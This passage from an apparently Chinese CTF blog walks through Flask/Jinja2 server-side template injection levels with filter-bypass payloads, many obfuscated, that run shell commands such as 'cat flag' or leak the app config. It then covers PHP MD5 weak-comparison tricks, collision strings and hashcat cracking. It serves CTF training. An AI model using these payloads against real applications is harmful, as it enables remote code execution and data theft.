class="hljs-name">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><br></code></pre></td></tr></table></figure>可知，上面6句都是等价的。![image-20250216105441416](https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202507132358458.png)# Level 5过滤单双引号这里我们要引入`request`：`request` 在 Flask 中可以访问基于 HTTP 请求传递的所有信息。此 `request` 并非 Python 的函数，而是在 Flask 内部的函数。| 属性/方法               | 描述                                                         || ----------------------- | ------------------------------------------------------------ || `request.args.key`      | 获取 GET 请求中传入的 `key` 的值。                           || `request.values.参数名` | 获取所有参数（包括 GET 和 POST）。                           || `request.cookies`       | 获取传入的 cookies 参数。                                    || `request.headers`       | 获取请求头中的参数。                                         || `request.form.key`      | 获取 POST 请求中传入的 `key` 的值（`Content-Type` 为 `application/x-www-form-urlencoded` 或 `multipart/form-data`）。 || `request.data`          | 获取 POST 请求中传入的参数（`Content-Type:a/b` ）。          || `request.json`          | 获取 POST 请求中传入的 JSON 参数（`Content-Type` 为 `application/json`）。 |我们这里试试GET的我们的payload`&#123;&#123;lipsum.__globals__.os.popen('ls').read()&#125;&#125;`中系统命令处有引号，所以我们替换为`&#123;&#123;lipsum.__globals__.os.popen(request.args.k1).read()&#125;&#125;`<img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202507132358781.png" alt="image-20250216114325149" style="zoom:67%;" />试试POST`code=&#123;&#123;lipsum.__globals__.os.popen(request.form.x1).read()&#125;&#125;&x1=cat flag`![image-20250216114210921](https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202507132358898.png)# Level 6这关过滤下划线这里我们讲一下flask常用过滤器：| flask常用过滤器          | 描述                                                         || ------------------------ | ------------------------------------------------------------ || `length()`               | 获取一个序列或者字典的长度并将其返回。                       || `int()`                  | 将值转换为 `int` 类型。                                      || `float()`                | 将值转换为 `float` 类型。                                    || `lower()`                | 将字符串转换为小写。                                         || `upper()`                | 将字符串转换为大写。                                         || `reverse()`              | 反转字符串。                                                 || `replace(value,old,new)` | 将 `value` 中的 `old` 替换为 `new`。                         || `list()`                 | 将变量转换为列表类型。                                       || `string()`               | 将变量转换成字符串类型。                                     || `join()`                 | 将一个序列中的参数值拼接成字符串，通常与 Python 内置的 `dict()` 配合使用。 || `attr()`                 | 获取对象的属性。                                             |过滤器通过管道符号 (`|`) 与变量连接，并且在括号中可能有可选的参数。应对过滤下划线，我们以下几种方法：1. 使用request方法（结合过滤器attr）2. 使用hex编码3. 使用unicode编码4. 使用base64编码(不建议用，仅python2支持)5. 格式化字符串`&#123;&#123;lipsum.__globals__.os.popen('ls').read()&#125;&#125;`中有`__globals__`**第1种，**这里我们需要使用过滤器attr，所以应该将`&#123;&#123;lipsum.__globals__.os.popen('ls').read()&#125;&#125;`换为`&#123;&#123;lipsum.__globals__.__getitem__('os').popen('ls').read()&#125;&#125;`然后再转换<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;lipsum|attr(request.args.<span class="hljs-built_in">globals</span>)|attr(request.args.getitem)(<span class="hljs-string">&#x27;os&#x27;</span>)|attr(<span class="hljs-string">&#x27;popen&#x27;</span>)(<span class="hljs-string">&#x27;ls&#x27;</span>)|attr(<span class="hljs-string">&#x27;read&#x27;</span>)()&#125;&#125;<br></code></pre></td></tr></table></figure>注意GET传参`?globals=__globals__&getitem=__getitem__`**第2种，**`_`编码后为`\x5f`<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;lipsum[<span class="hljs-string">&#x27;\x5f\x5fglobals\x5f\x5f&#x27;</span>].os.popen(<span class="hljs-string">&#x27;cat flag&#x27;</span>).read()&#125;&#125;<br></code></pre></td></tr></table></figure>**第3种，**<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;lipsum[<span class="hljs-string">&#x27;\u005f\u005fglobals\u005f\u005f&#x27;</span>].os.popen(<span class="hljs-string">&#x27;cat flag&#x27;</span>).read()&#125;&#125;<br><br>&#123;&#123;lipsum|attr(<span class="hljs-string">&quot;\u005f\u005fglobals\u005f\u005f&quot;</span>)|attr(<span class="hljs-string">&quot;\u005f\u005fgetitem\u005f\u005f&quot;</span>)(<span class="hljs-string">&quot;os&quot;</span>)|attr(<span class="hljs-string">&quot;popen&quot;</span>)(<span class="hljs-string">&quot;cat flag&quot;</span>)|attr(<span class="hljs-string">&quot;read&quot;</span>)()&#125;&#125;<br></code></pre></td></tr></table></figure>**第4种，**（不建议，这里不好使）<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;()|<span class="hljs-name">attr</span>(<span class="hljs-name">&#x27;X19jbGFzc19f&#x27;.decode</span>(<span class="hljs-name">&#x27;base64&#x27;</span>))|attr(<span class="hljs-name">&#x27;X19iYXNlX18=&#x27;.decode</span>(<span class="hljs-name">&#x27;base64&#x27;</span>))|attr(<span class="hljs-name">&#x27;X19zdWJjbGFzc2VzX18=&#x27;.decode</span>(<span class="hljs-name">&#x27;base64&#x27;</span>))()|attr(<span class="hljs-name">&#x27;X19nZXRpdGVtX18=&#x27;.decode</span>(<span class="hljs-name">&#x27;base64&#x27;</span>))(<span class="hljs-name">213</span>)|attr(<span class="hljs-name">&#x27;X19pbml0X18=&#x27;.decode</span>(<span class="hljs-name">&#x27;base64&#x27;</span>))|attr(<span class="hljs-name">&#x27;X19nbG9iYWxzX18=&#x27;.decode</span>(<span class="hljs-name">&#x27;base64&#x27;</span>))|attr(<span class="hljs-name">&#x27;X19nZXRpdGVtX18=&#x27;.decode</span>(<span class="hljs-name">&#x27;base64&#x27;</span>))(<span class="hljs-name">&#x27;os&#x27;</span>)|attr(<span class="hljs-name">&#x27;popen&#x27;</span>)(<span class="hljs-name">&#x27;cat flag&#x27;</span>)|attr(<span class="hljs-name">&#x27;read&#x27;</span>)()&#125;&#125;</span><br></code></pre></td></tr></table></figure>**第5种，**<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">lipsum</span>[&quot;%c%cglobals%c%c&quot;%(95,95,95,95)].os.popen(<span class="hljs-name">&#x27;cat flag&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">lipsum</span>|attr(<span class="hljs-name">&quot;%c%cglobals%c%c&quot;</span>%(<span class="hljs-name">95</span>,<span class="hljs-number">95</span>,<span class="hljs-number">95</span>,<span class="hljs-number">95</span>))|attr(<span class="hljs-name">&quot;%c%cgetitem%c%c&quot;</span>%(<span class="hljs-name">95</span>,<span class="hljs-number">95</span>,<span class="hljs-number">95</span>,<span class="hljs-number">95</span>))(<span class="hljs-name">&quot;os&quot;</span>)|attr(<span class="hljs-name">&quot;popen&quot;</span>)(<span class="hljs-name">&quot;cat flag&quot;</span>)|attr(<span class="hljs-name">&quot;read&quot;</span>)()&#125;&#125;</span><br></code></pre></td></tr></table></figure># Level 7过滤点我们有两种方法：1. 用中括号代替点（见第四关）2. 用attr()绕过**第一种，**`&#123;&#123;lipsum.__globals__.os.popen('ls').read()&#125;&#125;`改为`&#123;&#123;lipsum['__globals__']['os']['popen']('ls')['read']()&#125;&#125;`<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs rust">&#123;&#123;lipsum[<span class="hljs-string">&#x27;<span class="hljs-char escape_">\x</span>5f<span class="hljs-char escape_">\x</span>5f<span class="hljs-char escape_">\x</span>67<span class="hljs-char escape_">\x</span>6c<span class="hljs-char escape_">\x</span>6f<span class="hljs-char escape_">\x</span>62<span class="hljs-char escape_">\x</span>61<span class="hljs-char escape_">\x</span>6c<span class="hljs-char escape_">\x</span>73<span class="hljs-char escape_">\x</span>5f<span class="hljs-char escape_">\x</span>5f&#x27;</span>][<span class="hljs-string">&#x27;<span class="hljs-char escape_">\x</span>6f<span class="hljs-char escape_">\x</span>73&#x27;</span>][<span class="hljs-string">&#x27;<span class="hljs-char escape_">\x</span>70<span class="hljs-char escape_">\x</span>6f<span class="hljs-char escape_">\x</span>70<span class="hljs-char escape_">\x</span>65<span class="hljs-char escape_">\x</span>6e&#x27;</span>](<span class="hljs-string">&#x27;<span class="hljs-char escape_">\x</span>6c<span class="hljs-char escape_">\x</span>73&#x27;</span>)[<span class="hljs-string">&#x27;<span class="hljs-char escape_">\x</span>72<span class="hljs-char escape_">\x</span>65<span class="hljs-char escape_">\x</span>61<span class="hljs-char escape_">\x</span>64&#x27;</span>]()&#125;&#125;<br>__globals__ <span class="hljs-number">5</span>F5F676C6F62616C735F5F \x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f<br>os <span class="hljs-number">6</span>F73 \x6f\x73<br>popen <span class="hljs-number">706</span>F70656E \x70\x6f\x70\x65\x6e<br>ls <span class="hljs-number">6</span>C73 \x6c\x73<br>read <span class="hljs-number">72656164</span> \x72\x65\x61\x64<br></code></pre></td></tr></table></figure>**第二种，**<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">lipsum</span>|attr(<span class="hljs-name">&#x27;__globals__&#x27;</span>)|attr(<span class="hljs-name">&#x27;__getitem__&#x27;</span>)(<span class="hljs-name">&#x27;os&#x27;</span>)|attr(<span class="hljs-name">&#x27;popen&#x27;</span>)(<span class="hljs-name">&#x27;ls&#x27;</span>)|attr(<span class="hljs-name">&#x27;read&#x27;</span>)()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">lipsum</span>|attr(<span class="hljs-name">&quot;\u005f\u005fglobals\u005f\u005f&quot;</span>)|attr(<span class="hljs-name">&quot;\u005f\u005fgetitem\u005f\u005f&quot;</span>)(<span class="hljs-name">&quot;os&quot;</span>)|attr(<span class="hljs-name">&quot;popen&quot;</span>)(<span class="hljs-name">&quot;cat flag&quot;</span>)|attr(<span class="hljs-name">&quot;read&quot;</span>)()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">lipsum</span>|attr(<span class="hljs-name">&quot;%c%cglobals%c%c&quot;</span>%(<span class="hljs-name">95</span>,<span class="hljs-number">95</span>,<span class="hljs-number">95</span>,<span class="hljs-number">95</span>))|attr(<span class="hljs-name">&quot;%c%cgetitem%c%c&quot;</span>%(<span class="hljs-name">95</span>,<span class="hljs-number">95</span>,<span class="hljs-number">95</span>,<span class="hljs-number">95</span>))(<span class="hljs-name">&quot;os&quot;</span>)|attr(<span class="hljs-name">&quot;popen&quot;</span>)(<span class="hljs-name">&quot;cat flag&quot;</span>)|attr(<span class="hljs-name">&quot;read&quot;</span>)()&#125;&#125;</span><br></code></pre></td></tr></table></figure># Level 8过滤关键字`“class”, “arg”, “form”, “value”, “data”, “request”, “init”, “global”, “open”, “mro”, “base”, “attr”`这里有5种方法：1. 字符编码2. 字符拼接3. 使用Jinja2中的`~`拼接4. 使用过滤器（reverse反转、replace替换、join拼接）5. 利用python的char()**第一种**前面用过，这里就不再提了**第二种，**`&#123;&#123;lipsum['__globals__']['os']['popen']('ls')['read']()&#125;&#125;`改为<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;lipsum[<span class="hljs-string">&#x27;__glo&#x27;</span><span class="hljs-string">&#x27;bals__&#x27;</span>][<span class="hljs-string">&#x27;os&#x27;</span>][<span class="hljs-string">&#x27;pop&#x27;</span><span class="hljs-string">&#x27;en&#x27;</span>](<span class="hljs-string">&#x27;ls&#x27;</span>)[<span class="hljs-string">&#x27;read&#x27;</span>]()&#125;&#125;<br><br>&#123;&#123;lipsum[<span class="hljs-string">&#x27;__glo&#x27;</span>+<span class="hljs-string">&#x27;bals__&#x27;</span>][<span class="hljs-string">&#x27;os&#x27;</span>][<span class="hljs-string">&#x27;pop&#x27;</span>+<span class="hljs-string">&#x27;en&#x27;</span>](<span class="hljs-string">&#x27;cat flag&#x27;</span>)[<span class="hljs-string">&#x27;read&#x27;</span>]()&#125;&#125;<br></code></pre></td></tr></table></figure>**第三种，**<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&#123;%<span class="hljs-built_in">set</span> <span class="hljs-attribute">a</span>=<span class="hljs-string">&#x27;__glo&#x27;</span>%&#125;&#123;%<span class="hljs-built_in">set</span> <span class="hljs-attribute">b</span>=<span class="hljs-string">&#x27;bals__&#x27;</span>%&#125;&#123;%<span class="hljs-built_in">set</span> <span class="hljs-attribute">c</span>=<span class="hljs-string">&#x27;po&#x27;</span>%&#125;&#123;%<span class="hljs-built_in">set</span> <span class="hljs-attribute">d</span>=<span class="hljs-string">&#x27;pen&#x27;</span>%&#125;&#123;&#123;lipsum[a~b][<span class="hljs-string">&#x27;os&#x27;</span>][c~d](<span class="hljs-string">&#x27;ls&#x27;</span>)[<span class="hljs-string">&#x27;read&#x27;</span>]()&#125;&#125;<br></code></pre></td></tr></table></figure>**第四种，**<figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs twig"><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> a=<span class="hljs-string">&quot;__slabolg__&quot;</span><span class="hljs-punctuation">|</span><span class="hljs-keyword">reverse</span><span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> b=<span class="hljs-string">&quot;nepop&quot;</span><span class="hljs-punctuation">|</span><span class="hljs-keyword">reverse</span><span class="hljs-template-tag">%&#125;</span><span class="hljs-template-variable">&#123;&#123;lipsum[a][<span class="hljs-string">&#x27;os&#x27;</span>][b](<span class="hljs-string">&#x27;ls&#x27;</span>)[<span class="hljs-string">&#x27;read&#x27;</span>]()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> a=<span class="hljs-string">&quot;__gmmbals__&quot;</span><span class="hljs-punctuation">|</span><span class="hljs-keyword">replace</span>(<span class="hljs-string">&quot;mm&quot;</span>,<span class="hljs-string">&quot;lo&quot;</span>)<span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> b=<span class="hljs-string">&quot;pommn&quot;</span><span class="hljs-punctuation">|</span><span class="hljs-keyword">replace</span>(<span class="hljs-string">&quot;mm&quot;</span>,<span class="hljs-string">&quot;pe&quot;</span>)<span class="hljs-template-tag">%&#125;</span><span class="hljs-template-variable">&#123;&#123;lipsum[a][<span class="hljs-string">&#x27;os&#x27;</span>][b](<span class="hljs-string">&#x27;ls&#x27;</span>)[<span class="hljs-string">&#x27;read&#x27;</span>]()&#125;&#125;</span><br></code></pre></td></tr></table></figure>**第五种，**从内置函数里面获取 ASCII 解码功能，并赋值给变量 chr，从而使得chr变为可以ASCII 解码的函数原理大概是这样，但下面payload有问题，并不好使<figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs twig"><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">set</span> chr=url_for.__globals__[<span class="hljs-string">&#x27;__builtins_&#x27;</span>].chr <span class="hljs-template-tag">%&#125;</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-string">&quot;&quot;</span>[chr(<span class="hljs-number">95</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-number">95</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-number">99</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-number">108</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-number">97</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-number">115</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-number">115</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-number">95</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-number">95</span>)]&#125;&#125;</span><br></code></pre></td></tr></table></figure># Level 9过滤数字但我们的payload并没有数字`&#123;&#123;lipsum.__globals__.os.popen('ls').read()&#125;&#125;`为了学习，我们这里还是讲如何构造数字，比如我们构造10：`&#123;%set a='aaaaaaaaaa'|length%&#125;&#123;&#123;a&#125;&#125;`![image-20250216155226644](https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202507132358687.png)然后我们构造199，利用第一关的payload<figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs twig"><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> a=<span class="hljs-string">&#x27;aaaaaaaaaa&#x27;</span><span class="hljs-punctuation">|</span><span class="hljs-keyword">length</span>*<span class="hljs-string">&#x27;aaaaaaaaaa&#x27;</span><span class="hljs-punctuation">|</span><span class="hljs-keyword">length</span>*<span class="hljs-string">&#x27;aa&#x27;</span><span class="hljs-punctuation">|</span><span class="hljs-keyword">length</span>-<span class="hljs-string">&#x27;a&#x27;</span><span class="hljs-punctuation">|</span><span class="hljs-keyword">length</span><span class="hljs-template-tag">%&#125;</span><span class="hljs-template-variable">&#123;&#123;().__class__.__base__.__subclasses__()[a].__init__.__globals__[<span class="hljs-string">&#x27;os&#x27;</span>].popen(<span class="hljs-string">&quot;cat flag&quot;</span>).read()&#125;&#125;</span><br></code></pre></td></tr></table></figure>![image-20250216155604275](https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202507132358744.png)# Level 10直接获取config失败![image-20250216160126527](https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202507132358189.png)还有别的获取config的方法<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">url_for.__globals__</span>[&#x27;current_app&#x27;].config&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">get_flashed_messages.__globals__</span>[&#x27;current_app&#x27;].config&#125;&#125;</span><br></code></pre></td></tr></table></figure>这里我们再提一下常见的内置函数和内置对象，| 类型         | 名称/方法              | 描述                                                         | 典型用途或示例                                               || ------------ | ---------------------- | ------------------------------------------------------------ | ------------------------------------------------------------ || **内置函数** | `lipsum`               | 用于生成 Lorem Ipsum 占位文本，默认提供多段随机文本。        | 模板中填充测试内容：`&#123;&#123; lipsum() &#125;&#125;`。                       ||              | `url_for`              | 根据视图函数名生成对应的 URL 路径，支持动态参数。            | 生成链接：`<a href="&#123;&#123; url_for('home') &#125;&#125;">Home</a>`。       ||              | `get_flashed_messages` | 获取通过 `flash()` 方法设置的闪现消息，通常用于一次性提示（如成功/错误消息）。 | 显示消息：`&#123;% for msg in get_flashed_messages() %&#125;&#123;&#123; msg &#125;&#125;&#123;% endfor %&#125;</code>。</td></tr><tr><td><strong>内置对象</strong></td><td><code>cycler</code></td><td>Jinja2 的循环状态管理工具，用于跟踪迭代进度（如奇偶行标记）。</td><td>标记交替行：<code>&#123;% set cycle = cycler("odd", "even") %&#125;</code>。</td></tr><tr><td></td><td><code>joiner</code></td><td>Jinja2 的字符串拼接工具，自动处理分隔符（如逗号）。</td><td>拼接列表：&#96;</td></tr></tbody></table>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Web安全中的哈希函数</title>
    <link href="/2025/07/13/Web%E5%AE%89%E5%85%A8%E4%B8%AD%E7%9A%84%E5%93%88%E5%B8%8C%E5%87%BD%E6%95%B0/"/>
    <url>/2025/07/13/Web%E5%AE%89%E5%85%A8%E4%B8%AD%E7%9A%84%E5%93%88%E5%B8%8C%E5%87%BD%E6%95%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="md5"><a href="#md5" class="headerlink" title="md5"></a>md5</h1><h2 id="弱碰撞"><a href="#弱碰撞" class="headerlink" title="弱碰撞"></a>弱碰撞</h2><p>php中的MD5碰撞常与若比较进行结合</p><p>这种情况下，弱碰撞即可解决</p><ol><li><p>弱比较：</p><p>如果两个字符经MD5加密后的值为 0exxxxx形式，就会被认为是科学计数法，且表示的是0*10的xxxx次方，还是零，都是相等的。</p><p>下面代码为具体情况，</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>]!=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>&amp;&amp; md5(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>])==md5(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;success!&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>下列的字符串的MD5值都是0e开头的：</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs dns">QNKCDZO<br><span class="hljs-number">240610708</span><br>s878926199a<br>s155964671a<br>s214587387a<br>s214587387a<br></code></pre></td></tr></table></figure><p>双重MD5加密后0E开头：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs">7r4lGXCH2Ksu2JNT3BYM<br>CbDLytmyGm2xQyaLNhWn<br>770hQgrBOjrcqftrlaZk<br></code></pre></td></tr></table></figure></li><li><p>强比较：</p><p>md5()函数无法处理数组，如果传入的为数组，会返回NULL，所以两个数组经过加密后得到的都是NULL,也就是相等的。 例如 a[]&#x3D;1&amp;b[]&#x3D;2。</p><p>具体情况如下，</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>] !== <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>] &amp;&amp; md5(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>]) === md5(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;success!&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>强比较：</p><p>NAN和INF，分别为非数字和无穷大，但是var_dump一下它们的数据类型却是double，那么在md5函数处理它们的时候，是将其直接转换为字符串”NAN”和字符串”INF”使用的，但是它们拥有特殊的性质，它们与任何数据类型（除了true）做强类型或弱类型比较均为false，甚至<code>NAN=NAN</code>都是false，但<code>md5(&#39;NaN&#39;)=md5(&#39;NaN&#39;)</code>为true。</p></li></ol><h2 id="强碰撞"><a href="#强碰撞" class="headerlink" title="强碰撞"></a>强碰撞</h2><p>加了一个string转换，导致&#x3D;&#x3D;绕不过去（因为空数组转字符串为null，数组转换为字符串时都会变成Array）</p><p>具体情况如下，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> ((<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>] !== (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>] &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>]) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;success!&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>这样我们就必须运用MD5强碰撞</p><p>比如，</p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs excel"><span class="hljs-symbol">md5</span>(<span class="hljs-string">&quot;TEXTCOLLBYfGiJUETHQ4hAcKSMd5zYpgqf1YRDhkmxHkhPWptrkoyz28wnI9V0aHeAuaKnak&quot;</span>)<br>=<br><span class="hljs-symbol">md5</span>(<span class="hljs-string">&quot;TEXTCOLLBYfGiJUETHQ4hEcKSMd5zYpgqf1YRDhkmxHkhPWptrkoyz28wnI9V0aHeAuaKnak&quot;</span>)<br></code></pre></td></tr></table></figure><p>当然，有时候题目或许会要求我们两个碰撞参数的前缀相同，那么此时，我们就可以定制前缀一致的MD5强碰撞（比如上面这对，前缀就是一样的）</p><p>可以有的三种方法</p><ul><li><p>在线网站：<a href="https://rivers.chaitin.cn/tools/md5fastcollision">https://rivers.chaitin.cn/tools/md5fastcollision</a></p></li><li><p>常用工具：fastcoll</p></li><li><p>开源工具hashclash：<a href="https://github.com/cr-marcstevens/hashclash">https://github.com/cr-marcstevens/hashclash</a></p></li></ul><p>注意一点，post时一定要urlencode！！！</p><h2 id="MD5爆破"><a href="#MD5爆破" class="headerlink" title="MD5爆破"></a>MD5爆破</h2><p>有时候，还会要求根据MD5碰撞后的结果，倒推出部分字符，这时候我们就必须借助工具：</p><ul><li>hashcat：<a href="https://github.com/hashcat/hashcat">https://github.com/hashcat/hashcat</a></li></ul><p>比如，</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">hashcat</span> -a <span class="hljs-number">3</span> -m <span class="hljs-number">0</span> <span class="hljs-number">8</span>df2643c35506af082e7a97c813b133d flag&#123;<span class="hljs-number">753</span>?h22?h6-<span class="hljs-number">05</span>?hf-<span class="hljs-number">441</span>?h-b?h01-<span class="hljs-number">822</span>?h5f04c?h3?h&#125;<br></code></pre></td></tr></table></figure><p>使用4060无CUDA驱动的情况下，20秒完成，爆破出flag{75382286-055f-441d-b601-82275f04c13a}</p><p>有时候甚至会直接给你一个MD5值或者双MD5值，让你爆破出原值，</p><p>这时候我们往往采用在线网站，如：<a href="https://www.cmd5.com/">https://www.cmd5.com/</a></p><h2 id="md5截断爆破"><a href="#md5截断爆破" class="headerlink" title="md5截断爆破"></a>md5截断爆破</h2><p>代码如下：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">substr</span><span class="hljs-params">(md5(?)</span></span>,<span class="hljs-number">0</span>,<span class="hljs-number">5</span>)===<span class="hljs-string">&#x27;8ffb1&#x27;</span><br></code></pre></td></tr></table></figure><p>一般使用脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">from</span> multiprocessing.dummy <span class="hljs-keyword">import</span> Pool <span class="hljs-keyword">as</span> ThreadPool<br><br><span class="hljs-comment"># MD5截断数值已知 求原始数据</span><br><span class="hljs-comment"># 例子 substr(md5(captcha), 0, 6)=60b7ef</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">md5</span>(<span class="hljs-params">s</span>):  <span class="hljs-comment"># 计算MD5字符串</span><br>    <span class="hljs-keyword">return</span> hashlib.md5(<span class="hljs-built_in">str</span>(s).encode(<span 